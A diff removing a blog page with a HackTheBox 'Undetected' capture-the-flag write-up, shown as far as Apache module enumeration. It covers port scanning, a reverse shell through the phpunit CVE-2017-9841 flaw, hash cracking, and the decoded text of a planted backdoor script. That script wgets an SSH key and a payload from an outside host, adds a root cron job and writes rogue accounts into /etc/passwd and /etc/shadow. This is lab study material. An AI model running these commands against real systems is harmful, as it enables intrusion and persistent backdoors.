@@ -1,540 +1,0 @@
-<!DOCTYPE html>
-<html lang="en">
-    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-        <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="author" content="nair0lf32 ">
-<meta name="description" content="enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2 (protocol 2.0)| ssh-hostkey: | 3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDeVJjvJKCD1dlTm7jo6sY5A6q2oWFakWfH/y6lkWB5eIeVxzQTT/XXyA2RW/Zegb7vbpculYjr6cPtbouTLqPkyi2Xzyk3Jz2jQHKi6qTcHIQL75tITJKPCag4tAAIvKpSCwT13B38TKd0KV2R8T59raCu83095p/GaLrdhwGUbuD0p&#43;/GnN1jIsLs04V26rbPKLmMJLj7Dj/&#43;yCo/CF88/4EQaFFC920sjln4FZ7FlVhv4mIwIb10nIsEgvsKBIGvvu4ZKKKU&#43;Al6p8bYI50srY/plKu0RxZpKE6QGV17IC38q8CDsLWkmFr5emeIxHfvgUlYaAOruACcnru6azsJw69s2Kq/dKaz8K6PjRb9Ybf6/Ix8xGhfJ/gH6x0PhlxIKXD1M93XILJmgKRPJpzqrA6NZ&#43;mtQwx0JFsgHHJno/TSrx00E6GPEtUPHcxOVZE0m0Y9rfd5Q8W6/eJN/Q3nMIywfHKZE1RUQOziGtud/jAOOApvrRHRO6l0riwQCK8=| 256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBQjfhdRHFh&#43;eC/2RtmQwDSGmf0psHnd2uqXFyN0zdiyxvF3WCQYaxOgerNZqC0RyQjm2hW0DN6/0oim3slS8dw=| 256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFdnC6v7My/dt23PaoX7MGbuZ8/8KZh1O&#43;xt4dDFvFQK80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu))|_http-title: Diana&amp;#39;s Jewelry| http-methods: |_ Supported Methods: HEAD GET POST OPTIONS|_http-server-header: Apache/2.4.41 (Ubuntu)8081/tcp open http syn-ack SimpleHTTPServer 0.6 (Python 3.8.10)|_http-title: Directory listing for /| http-methods: |_ Supported Methods: GET HEAD|_http-server-header: SimpleHTTP/0." />
-<meta name="keywords" content="hacking, cybersecurity, ctf, nair0lf32, zerone, zer0ne" />
-<meta name="robots" content="noodp" />
-<meta name="theme-color" content="" />
-<link rel="canonical" href="http://localhost:1313/writeups/hackthebox/undetected/undetected/" />
-
-
-    <title>
-        
-            Undetected :: Zer0ne blog 
-        
-    </title>
-
-
-
-<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
-    type="text/css">
-
-
-
-<link rel="stylesheet" href="http://localhost:1313/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
-
-
-
-    <link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-    <link rel="manifest" href="http://localhost:1313/site.webmanifest">
-    <link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg" color="">
-    <link rel="shortcut icon" href="http://localhost:1313/favicon.ico">
-    <meta name="msapplication-TileColor" content="">
-
-
-<meta itemprop="name" content="Undetected">
-<meta itemprop="description" content="enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2 (protocol 2.0)| ssh-hostkey: | 3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDeVJjvJKCD1dlTm7jo6sY5A6q2oWFakWfH/y6lkWB5eIeVxzQTT/XXyA2RW/Zegb7vbpculYjr6cPtbouTLqPkyi2Xzyk3Jz2jQHKi6qTcHIQL75tITJKPCag4tAAIvKpSCwT13B38TKd0KV2R8T59raCu83095p/GaLrdhwGUbuD0p&#43;/GnN1jIsLs04V26rbPKLmMJLj7Dj/&#43;yCo/CF88/4EQaFFC920sjln4FZ7FlVhv4mIwIb10nIsEgvsKBIGvvu4ZKKKU&#43;Al6p8bYI50srY/plKu0RxZpKE6QGV17IC38q8CDsLWkmFr5emeIxHfvgUlYaAOruACcnru6azsJw69s2Kq/dKaz8K6PjRb9Ybf6/Ix8xGhfJ/gH6x0PhlxIKXD1M93XILJmgKRPJpzqrA6NZ&#43;mtQwx0JFsgHHJno/TSrx00E6GPEtUPHcxOVZE0m0Y9rfd5Q8W6/eJN/Q3nMIywfHKZE1RUQOziGtud/jAOOApvrRHRO6l0riwQCK8=| 256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBQjfhdRHFh&#43;eC/2RtmQwDSGmf0psHnd2uqXFyN0zdiyxvF3WCQYaxOgerNZqC0RyQjm2hW0DN6/0oim3slS8dw=| 256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFdnC6v7My/dt23PaoX7MGbuZ8/8KZh1O&#43;xt4dDFvFQK80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu))|_http-title: Diana&#39;s Jewelry| http-methods: |_ Supported Methods: HEAD GET POST OPTIONS|_http-server-header: Apache/2.4.41 (Ubuntu)8081/tcp open http syn-ack SimpleHTTPServer 0.6 (Python 3.8.10)|_http-title: Directory listing for /| http-methods: |_ Supported Methods: GET HEAD|_http-server-header: SimpleHTTP/0."><meta itemprop="datePublished" content="2022-09-20T15:03:31+01:00" />
-<meta itemprop="dateModified" content="2024-01-31T11:24:29+01:00" />
-<meta itemprop="wordCount" content="1896"><meta itemprop="image" content="http://localhost:1313/" />
-<meta itemprop="keywords" content="" />
-<meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="http://localhost:1313/" /><meta name="twitter:title" content="Undetected"/>
-<meta name="twitter:description" content="enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2 (protocol 2.0)| ssh-hostkey: | 3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDeVJjvJKCD1dlTm7jo6sY5A6q2oWFakWfH/y6lkWB5eIeVxzQTT/XXyA2RW/Zegb7vbpculYjr6cPtbouTLqPkyi2Xzyk3Jz2jQHKi6qTcHIQL75tITJKPCag4tAAIvKpSCwT13B38TKd0KV2R8T59raCu83095p/GaLrdhwGUbuD0p&#43;/GnN1jIsLs04V26rbPKLmMJLj7Dj/&#43;yCo/CF88/4EQaFFC920sjln4FZ7FlVhv4mIwIb10nIsEgvsKBIGvvu4ZKKKU&#43;Al6p8bYI50srY/plKu0RxZpKE6QGV17IC38q8CDsLWkmFr5emeIxHfvgUlYaAOruACcnru6azsJw69s2Kq/dKaz8K6PjRb9Ybf6/Ix8xGhfJ/gH6x0PhlxIKXD1M93XILJmgKRPJpzqrA6NZ&#43;mtQwx0JFsgHHJno/TSrx00E6GPEtUPHcxOVZE0m0Y9rfd5Q8W6/eJN/Q3nMIywfHKZE1RUQOziGtud/jAOOApvrRHRO6l0riwQCK8=| 256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBQjfhdRHFh&#43;eC/2RtmQwDSGmf0psHnd2uqXFyN0zdiyxvF3WCQYaxOgerNZqC0RyQjm2hW0DN6/0oim3slS8dw=| 256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFdnC6v7My/dt23PaoX7MGbuZ8/8KZh1O&#43;xt4dDFvFQK80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu))|_http-title: Diana&#39;s Jewelry| http-methods: |_ Supported Methods: HEAD GET POST OPTIONS|_http-server-header: Apache/2.4.41 (Ubuntu)8081/tcp open http syn-ack SimpleHTTPServer 0.6 (Python 3.8.10)|_http-title: Directory listing for /| http-methods: |_ Supported Methods: GET HEAD|_http-server-header: SimpleHTTP/0."/>
-
-
-
-    <meta property="og:title" content="Undetected" />
-<meta property="og:description" content="enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2 (protocol 2.0)| ssh-hostkey: | 3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDeVJjvJKCD1dlTm7jo6sY5A6q2oWFakWfH/y6lkWB5eIeVxzQTT/XXyA2RW/Zegb7vbpculYjr6cPtbouTLqPkyi2Xzyk3Jz2jQHKi6qTcHIQL75tITJKPCag4tAAIvKpSCwT13B38TKd0KV2R8T59raCu83095p/GaLrdhwGUbuD0p&#43;/GnN1jIsLs04V26rbPKLmMJLj7Dj/&#43;yCo/CF88/4EQaFFC920sjln4FZ7FlVhv4mIwIb10nIsEgvsKBIGvvu4ZKKKU&#43;Al6p8bYI50srY/plKu0RxZpKE6QGV17IC38q8CDsLWkmFr5emeIxHfvgUlYaAOruACcnru6azsJw69s2Kq/dKaz8K6PjRb9Ybf6/Ix8xGhfJ/gH6x0PhlxIKXD1M93XILJmgKRPJpzqrA6NZ&#43;mtQwx0JFsgHHJno/TSrx00E6GPEtUPHcxOVZE0m0Y9rfd5Q8W6/eJN/Q3nMIywfHKZE1RUQOziGtud/jAOOApvrRHRO6l0riwQCK8=| 256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBQjfhdRHFh&#43;eC/2RtmQwDSGmf0psHnd2uqXFyN0zdiyxvF3WCQYaxOgerNZqC0RyQjm2hW0DN6/0oim3slS8dw=| 256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFdnC6v7My/dt23PaoX7MGbuZ8/8KZh1O&#43;xt4dDFvFQK80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu))|_http-title: Diana&#39;s Jewelry| http-methods: |_ Supported Methods: HEAD GET POST OPTIONS|_http-server-header: Apache/2.4.41 (Ubuntu)8081/tcp open http syn-ack SimpleHTTPServer 0.6 (Python 3.8.10)|_http-title: Directory listing for /| http-methods: |_ Supported Methods: GET HEAD|_http-server-header: SimpleHTTP/0." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="http://localhost:1313/writeups/hackthebox/undetected/undetected/" /><meta property="og:image" content="http://localhost:1313/" /><meta property="article:section" content="writeups" />
-<meta property="article:published_time" content="2022-09-20T15:03:31+01:00" />
-<meta property="article:modified_time" content="2024-01-31T11:24:29+01:00" />
-
-
-
-
-
-    <meta property="article:section" content="HackTheBox" />
-
-
-
-    <meta property="article:published_time" content="2022-09-20 15:03:31 &#43;0100 WAT" />
-
-
-
-
-
-
-
-
-
-
-    </head>
-
-    
-        <body>
-    
-    
-        <div class="container">
-            <header class="header">
-    <span class="header__inner">
-        <a href="http://localhost:1313/" style="text-decoration: none;">
-    <div class="logo">
-        
-            <span class="logo__mark">#&gt;</span>
-            <span class="logo__text">0/1</span>
-            <span class="logo__cursor" style=
-                  "
-                   background-color:#0FF00D;
-                   animation-duration:2s;">
-            </span>
-        
-    </div>
-</a>
-
-
-        <span class="header__right">
-            
-                <nav class="menu">
-    <ul class="menu__inner"><li><a href="http://localhost:1313/about">About</a></li><li><a href="http://localhost:1313/posts">Blog</a></li><li><a href="http://localhost:1313/writeups">Writeups</a></li>
-    </ul>
-</nav>
-
-                <span class="menu-trigger">
-                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                        <path d="M0 0h24v24H0z" fill="none"/>
-                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
-                    </svg>
-                </span>
-            
-                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
-   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
-   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
-   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
- </svg></span>
-        </span>
-    </span>
-</header>
-
-
-            <div class="content">
-                
-    <main class="post">
-
-        <div class="post-info">
-            
-            </p>
-        </div>
-
-        <article>
-            <h2 class="post-title"><a href="http://localhost:1313/writeups/hackthebox/undetected/undetected/">Undetected</a></h2>
-
-            
-            
-            
-
-            <div class="post-content">
-                <h2 id="enumeration">enumeration</h2>
-<h3 id="nmap">nmap</h3>
-<pre tabindex="0"><code>PORT     STATE SERVICE REASON  VERSION
-22/tcp   open  ssh     syn-ack OpenSSH 8.2 (protocol 2.0)
-| ssh-hostkey: 
-|   3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)
-| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDeVJjvJKCD1dlTm7jo6sY5A6q2oWFakWfH/y6lkWB5eIeVxzQTT/XXyA2RW/Zegb7vbpculYjr6cPtbouTLqPkyi2Xzyk3Jz2jQHKi6qTcHIQL75tITJKPCag4tAAIvKpSCwT13B38TKd0KV2R8T59raCu83095p/GaLrdhwGUbuD0p+/GnN1jIsLs04V26rbPKLmMJLj7Dj/+yCo/CF88/4EQaFFC920sjln4FZ7FlVhv4mIwIb10nIsEgvsKBIGvvu4ZKKKU+Al6p8bYI50srY/plKu0RxZpKE6QGV17IC38q8CDsLWkmFr5emeIxHfvgUlYaAOruACcnru6azsJw69s2Kq/dKaz8K6PjRb9Ybf6/Ix8xGhfJ/gH6x0PhlxIKXD1M93XILJmgKRPJpzqrA6NZ+mtQwx0JFsgHHJno/TSrx00E6GPEtUPHcxOVZE0m0Y9rfd5Q8W6/eJN/Q3nMIywfHKZE1RUQOziGtud/jAOOApvrRHRO6l0riwQCK8=
-|   256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)
-| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBQjfhdRHFh+eC/2RtmQwDSGmf0psHnd2uqXFyN0zdiyxvF3WCQYaxOgerNZqC0RyQjm2hW0DN6/0oim3slS8dw=
-|   256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)
-|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFdnC6v7My/dt23PaoX7MGbuZ8/8KZh1O+xt4dDFvFQK
-
-80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
-|_http-title: Diana&#39;s Jewelry
-| http-methods: 
-|_  Supported Methods: HEAD GET POST OPTIONS
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-
-8081/tcp open  http    syn-ack SimpleHTTPServer 0.6 (Python 3.8.10)
-|_http-title: Directory listing for /
-| http-methods: 
-|_  Supported Methods: GET HEAD
-|_http-server-header: SimpleHTTP/0.6 Python/3.8.10
-</code></pre><h3 id="gobuster">Gobuster</h3>
-<pre tabindex="0"><code>/.hta                 (Status: 403) [Size: 283]
-/.htaccess            (Status: 403) [Size: 283]
-/.htpasswd            (Status: 403) [Size: 283]
-/css                  (Status: 301) [Size: 322] [--&gt; http://store.djewelry.htb/css/]
-/fonts                (Status: 301) [Size: 324] [--&gt; http://store.djewelry.htb/fonts/]
-/images               (Status: 301) [Size: 325] [--&gt; http://store.djewelry.htb/images/]
-/index.php            (Status: 200) [Size: 6215] 
-/js                   (Status: 301) [Size: 321] [--&gt; http://store.djewelry.htb/js/] 
-/server-status        (Status: 403) [Size: 283] 
-/vendor               (Status: 301) [Size: 325] [--&gt; http://store.djewelry.htb/vendor/]
-</code></pre><p>obviously we add the Ip to our known <code>hosts</code> as <code>djwelry.htb</code></p>
-<p>also there is a subdomain for the store so don&rsquo;t forget to add it too</p>
-<p>There is a weird directory listing on port <code>8081</code> from the python server but not much</p>
-<p>could not get any directory traversal</p>
-<p>On the website, there is not much either</p>
-<p>the <code>products.php</code> allow us to add products but when trying to access <code>cart.php</code> and <code>login.php</code> there is an error</p>
-<p>We then visit the <code>/vendor</code> directory we found&hellip;looks like some composer installation</p>
-<p>Let&rsquo;s check <code>phpunit</code>&hellip;and bingo! it&rsquo;s there and we can read it!</p>
-<pre tabindex="0"><code>if (version_compare(&#39;5.6.0&#39;, PHP_VERSION, &#39;&gt;&#39;)) {
-    fwrite(
-        STDERR,
-        &#39;This version of PHPUnit requires PHP 5.6; using the latest version of PHP is highly recommended.&#39; . PHP_EOL
-    );
-
-    die(1);
-}
-</code></pre><p>Long story short: <a href="https://www.cvedetails.com/cve/CVE-2017-9841/">CVE-2017-9841</a></p>
-<p>It&rsquo;s basically code injection, you can exploit it manually</p>
-<p>You don&rsquo;t know how to do, you say?</p>
-<p>Fret no more! vulnhub say &ldquo;<a href="https://github.com/vulhub/vulhub/blob/master/phpunit/CVE-2017-9841/README.md">I got you homie!</a>&rdquo;</p>
-<p>Now monkey see monkey do (please its a joke and an expression&hellip;don&rsquo;t go BLM on me I am black IRL)</p>
-<pre tabindex="0"><code>└──╼ $nc -lnvp 4444
-listening on [any] 4444 ...
-connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 43510
-/bin/sh: 0: can&#39;t access tty; job control turned off
-$ 
-</code></pre><p>Try to get the flag</p>
-<p>Get Reminded it&rsquo;s a medium box</p>
-<pre tabindex="0"><code>www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ ls /home  
-&lt;store/vendor/phpunit/phpunit/src/Util/PHP$ ls /home                    
-steven
-www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ ls -al /home/steven
-&lt;r/phpunit/phpunit/src/Util/PHP$ ls -al /home/steven                    
-ls: cannot open directory &#39;/home/steven&#39;: Permission denied
-</code></pre><p>Enumeration amirite? it&rsquo;s usually the <code>php.config</code> files</p>
-<p>But not this time&hellip;well&hellip;I tried to look around and I think I got stuck</p>
-<p><code>linpeas.sh</code> upload it is! (I just ran one someone uploaded in /tmp XD )</p>
-<p>Don&rsquo;t think it made it easier, you still have to filter out what cannot be used</p>
-<p>Took some time but I got this</p>
-<pre tabindex="0"><code>
-...
-
-╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
-╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
-uniq: write error: Broken pipe
-/dev/mqueue
-/dev/shm
-/dev/shm/pspy64
-/run/lock
-/run/lock/apache2
-/run/screen
-/run/screen/S-www-data
-/tmp
-/tmp/linpeas.sh
-/tmp/tmux-33
-/var/backups/info
-/var/cache/apache2/mod_cache_disk
-/var/crash
-/var/lib/php/sessions
-/var/tmp
-/var/tmp/ResourceOperations.php.swp
-/var/tmp/login.php.swp
-/var/tmp/products.php.swp
-/var/www/main
-
-...
-</code></pre><p><code>/var/backups/info</code> is the one standing out so lets see..It&rsquo;s an ELF binary</p>
-<p>I try to run it</p>
-<pre tabindex="0"><code>www-data@production:/tmp$ /var/backups/info
-[.] starting
-[.] namespace sandbox set up
-[.] KASLR bypass enabled, getting kernel addr
-[-] substring &#39;Freeing SMP&#39; not found in dmesg
-</code></pre><p>Uhh..okay Strings is not available so I just used &lsquo;cat&rsquo; on a binary (heresy!)</p>
-<p>I got something in all the gibberish</p>
-<pre tabindex="0"><code>sockopt(PACKET_VERSION)[-] setsockopt(PACKET_RX_RING)[-] socket(AF_PACKET)lo[-] bind(AF_PACKET)[-] sendto(SOCK_RAW)[-] socket(SOCK_RAW)[-] socket(SOCK_DGRAM)[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)[-] klogctl(SYSLOG_ACTION_READ_ALL)Freeing SMP[-] substring &#39;%s&#39; not found in dmesg
-ffff/bin/bash-c776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b[-] fork()/etc/shadow[.] checking if we got root[-] something went wrong =([+] got r00t ^_^[-] unshare(CLONE_NEWUSER)deny/proc/self/setgroups[-] write_file(/proc/self/set_groups)0 %d 1
-/proc/self/uid_map[-] write_file(/proc/self/uid_map)/proc/self/gid_map[-] write_file(/proc/self/gid_map)[-] sched_setaffinity()/sbin/ifconfig lo up[-] system(/sbin/ifconfig lo up)[.] starting[.] namespace sandbox set up[.] KASLR bypass enabled, getting kernel addr[.] done, kernel text:   %lx
-[.] commit_creds:        %lx
-[.] prepare_kernel_cred: %lx
-[.] native_write_cr4:    %lx
-</code></pre><p>Its hex&hellip; decode it to ASCII</p>
-<p>I made a little mistake there you can avoid: Do not include the &lsquo;c&rsquo; in &lsquo;bash-c&rsquo;</p>
-<p>Its understandable because c is a hex character BUT here the script try to execute the encoded command</p>
-<p>the <code>-c</code> is used to execute bash commands from strings (read the manual&hellip;duh)</p>
-<p>Anyway, take everything that comes after <code>bash-c</code> ( and before <code>[-]</code> obviously )</p>
-<p>Decode it how you want and get this:</p>
-<pre tabindex="0"><code>wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo &#34;* 3 * * * root /var/lib/.main&#34; &gt;&gt; /etc/crontab; awk -F&#34;:&#34; &#39;$7 == &#34;/bin/bash&#34; &amp;&amp; $3 &gt;= 1000 {system(&#34;echo &#34;$1&#34;1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: &gt;&gt; /etc/shadow&#34;)}&#39; /etc/passwd; awk -F&#34;:&#34; &#39;$7 == &#34;/bin/bash&#34; &amp;&amp; $3 &gt;= 1000 {system(&#34;echo &#34;$1&#34; &#34;$3&#34; &#34;$6&#34; &#34;$7&#34; &gt; users.txt&#34;)}&#39; /etc/passwd; while read -r user group home shell _; do echo &#34;$user&#34;1&#34;:x:$group:$group:,,,:$home:$shell&#34; &gt;&gt; /etc/passwd; done &lt; users.txt; rm users.txt;
-</code></pre><p>Yeah its better now! The script setup a password for a new user in /etc/passwd</p>
-<p>we got a hash!</p>
-<p>Reformat it! just remove the escape characters</p>
-<p>Looks like <code>SHA-512crypt</code> (google $6$ hash and check hashcat examples)</p>
-<pre tabindex="0"><code>$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/
-</code></pre><p>Fire up the cat in mode <code>1800</code></p>
-<pre tabindex="0"><code>└──╼ $hashcat -m 1800 &#39;$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/&#39; /usr/share/wordlists/rockyou.txt
-hashcat (v6.1.1) starting...
-
-...
-
-Dictionary cache hit:
-* Filename..: /usr/share/wordlists/rockyou.txt
-* Passwords.: 14344385
-* Bytes.....: 139921507
-* Keyspace..: 14344385
-
-$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:ihatehackers
-
-...
-</code></pre><p>So the creds are : <code>steven1:ihatehackers</code></p>
-<p>yup the script adds <code>1</code> to <code>$user</code> before adding it to <code>/etc/passwd</code></p>
-<p>I hope I can ssh with those</p>
-<p>Yup! we get the flag now</p>
-<pre tabindex="0"><code>steven@production:~$ ls -al
-total 40
-drwxr-x--- 6 steven steven 4096 Feb 26 22:57 .
-drwxr-xr-x 3 root   root   4096 Feb  8 19:59 ..
-lrwxrwxrwx 1 steven steven    9 Jul  5  2021 .bash_history -&gt; /dev/null
--rw-r--r-- 1 steven steven  220 Feb 25  2020 .bash_logout
--rw-r--r-- 1 steven steven 3771 Feb 25  2020 .bashrc
-drwx------ 2 steven steven 4096 Feb  8 19:59 .cache
-drwx------ 3 steven steven 4096 Feb 26 22:57 .gnupg
-drwxrwxr-x 3 steven steven 4096 Feb  8 19:59 .local
--rw-r--r-- 1 steven steven  807 Feb 25  2020 .profile
-drwx------ 2 steven steven 4096 Feb  8 19:59 .ssh
--rw-r----- 1 root   steven   33 Feb 26 22:44 user.txt
-steven@production:~$ cat user.txt
-undetected_user_flag
-</code></pre><h2 id="privilege-escalation">Privilege escalation</h2>
-<p>Steven might reuse his password for sudo you say?</p>
-<pre tabindex="0"><code>steven@production:~$ sudo -l
-[sudo] password for steven: 
-Sorry, try again.
-</code></pre><p>Quick reminder of this box level</p>
-<p>SUID gave us nothing useful too</p>
-<p>well&hellip;linpeas again (damn&hellip;twice!)</p>
-<pre tabindex="0"><code>...
-
-╔══════════╣ Searching installed mail applications
-
-╔══════════╣ Mails (limit 50)
-    17793      4 -rw-rw----   1 steven   mail          966 Jul 25  2021 /var/mail/steven
-    17793      4 -rw-rw----   1 steven   mail          966 Jul 25  2021 /var/spool/mail/steven
-
-...
-
-╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
-╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
-/dev/mqueue
-/dev/shm
-/dev/shm/linpeas.sh
-/home/steven
-...
-/var/crash
-/var/lib/php/sessions
-/var/mail/steven
-/var/tmp
-
-...
-</code></pre><p>Ok the mails are important!</p>
-<pre tabindex="0"><code>steven@production:/var/mail$ cat steven
-From root@production  Sun, 25 Jul 2021 10:31:12 GMT
-Return-Path: &lt;root@production&gt;
-Received: from production (localhost [127.0.0.1])
-        by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
-        for &lt;steven@production&gt;; Sun, 25 Jul 2021 10:31:12 GMT
-Received: (from root@localhost)
-        by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
-        Sun, 25 Jul 2021 10:31:12 GMT
-Date: Sun, 25 Jul 2021 10:31:12 GMT
-Message-Id: &lt;202107251031.80FAcdZ171847@production&gt;
-To: steven@production
-From: root@production
-Subject: Investigations
-
-Hi Steven.
-
-We recently updated the system but are still experiencing some strange behaviour with the Apache service.
-We have temporarily moved the web store and database to another server whilst investigations are underway.
-If for any reason you need access to the database or web application code, get in touch with Mark and he
-will generate a temporary password for you to authenticate to the temporary server.
-
-Thanks,
-sysadmin
-</code></pre><p>Ah yes&hellip;Mark&hellip;who tf is Mark?</p>
-<p>Lol let&rsquo;s just check the Apache installation in <code>/usr/lib/apache2</code></p>
-<p>We have access to the modules</p>
-<p>They said there was a recent update&hellip;what changed recently?</p>
-<pre tabindex="0"><code>steven@production:/usr/lib/apache2/modules$ ls --full-time -i | sort -u
- 2050 -rw-r--r-- 1 root root   34800 2021-05-17 07:10:04.000000000 +0000 mod_reader.so
- 5093 -rw-r--r-- 1 root root 4625776 2021-11-25 23:16:22.000000000 +0000 libphp7.4.so
- 7990 -rw-r--r-- 1 root root   15925 2022-01-05 14:49:56.000000000 +0000 httpd.exp
